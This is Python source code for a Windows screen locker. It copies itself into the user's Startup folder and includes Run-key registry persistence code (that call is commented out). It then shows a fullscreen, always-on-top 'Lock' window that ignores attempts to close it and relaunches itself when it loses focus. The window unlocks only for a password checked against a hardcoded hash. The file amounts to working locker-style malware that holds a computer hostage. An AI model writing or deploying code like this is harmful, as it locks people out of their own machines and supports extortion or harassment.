import hashlib
import sys
import pygame
import os
import getpass
import shutil
import win32con
import win32gui
import winreg


def set_autostart_registry(app_name, key_data=None, autostart: bool = True):
    """
    :param app_name:    A string containing the name of the application name
    :param key_data:    A string that specifies the application path.
    :param autostart:   True - create/update autostart key / False - delete autostart key
    """

    with winreg.OpenKey(
            key=winreg.HKEY_CURRENT_USER,
            sub_key=r'Software\Microsoft\Windows\CurrentVersion\Run',
            reserved=0,
            access=winreg.KEY_ALL_ACCESS,
    ) as key:
        try:
            if autostart:
                winreg.SetValueEx(key, app_name, 0, winreg.REG_SZ, key_data)
            else:
                winreg.DeleteValue(key, app_name)
        except OSError:
            return False
    return True


def check_autostart_registry(value_name):
    with winreg.OpenKey(
            key=winreg.HKEY_CURRENT_USER,
            sub_key=r'Software\Microsoft\Windows\CurrentVersion\Run',
            reserved=0,
            access=winreg.KEY_ALL_ACCESS,
    ) as key:
        idx = 0
        while idx < 1_000:     # Max 1.000 values
            try:
                key_name, _, _ = winreg.EnumValue(key, idx)
                if key_name == value_name:
                    return True
                idx += 1
            except OSError:
                break
    return False


def update_size(screen):
    return screen.get_width(), screen.get_height()


def check_input(input_text):
    input_salt = f'{input_text}{len(input_text)}'
    sha224 = hashlib.sha224()
    sha224.update(input_salt.encode())
    return sha224.hexdigest() == '9f17cd624f25b28374a58a6c107d3d0df4299ddccfe390eeba373d12'


def create_autorun():
    username = getpass.getuser()
    filename = 'main.exe'
    dir_name = f'C:/Users/{username}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/'
    try:
        shutil.copy(filename, dir_name)
    except:
        try:
            filename = 'dist/' + filename
            shutil.copy(filename, dir_name)
        except:
            pass


def create_autorun_reg(name):
    if check_autostart_registry(name):
        return
    set_autostart_registry(name)


def main():
    app_name = sys.argv[0][sys.argv[0].rfind('/')+1:]
    create_autorun()
    # create_autorun_reg(app_name[:app_name.find('.')] + 'not_malware')
    pygame.init()
    pygame.font.init()
    size = width, height = 1920, 1080
    screen = pygame.display.set_mode(size, pygame.FULLSCREEN | pygame.NOFRAME | pygame.WINDOWFOCUSGAINED)
    size = width, height = update_size(screen)
    flag = False

    hwnd = pygame.display.get_wm_info()["window"]
    win32gui.SetWindowPos(hwnd, win32con.HWND_TOPMOST, 0, 0, 0, 0, win32con.SWP_NOSIZE)

    BLACK = pygame.color.Color('black')
    RED = pygame.color.Color('red')
    WHITE = pygame.color.Color('white')

    font = pygame.font.Font(None, 74)
    input_text = ''
    attempts_count = 3
    end = False
    while not end:
        if not pygame.display.get_active() and not flag:
            print(os.system('.\main.exe'))
            flag = True

        for event in pygame.event.get():
            if event.type == pygame.QUIT:
                pass
                # end = True
            if event.type == pygame.KEYDOWN:
                if event.key == pygame.K_BACKSPACE:
                    input_text = input_text[:-1]
                elif event.key == pygame.K_RETURN:
                    if check_input(input_text):
                        end = True
                    input_text = ''
                    attempts_count -= 1
                else:
                    input_text += event.unicode

        header_surface = font.render('Lock', True, RED)
        attempts_surface = font.render(f'Attempts: {attempts_count}', True, RED)
        input_surface = font.render(input_text, True, WHITE)

        screen.fill(BLACK)
        screen.blit(header_surface, (width // 2 - header_surface.get_width() / 2, 250))
        screen.blit(attempts_surface, (width // 2 - attempts_surface.get_width() / 2, 350))
        screen.blit(input_surface, (width // 2 - input_surface.get_width() / 2, 500))
        pygame.display.flip()
        pygame.time.wait(5)
    sys.exit(0)


if __name__ == '__main__':
    main()
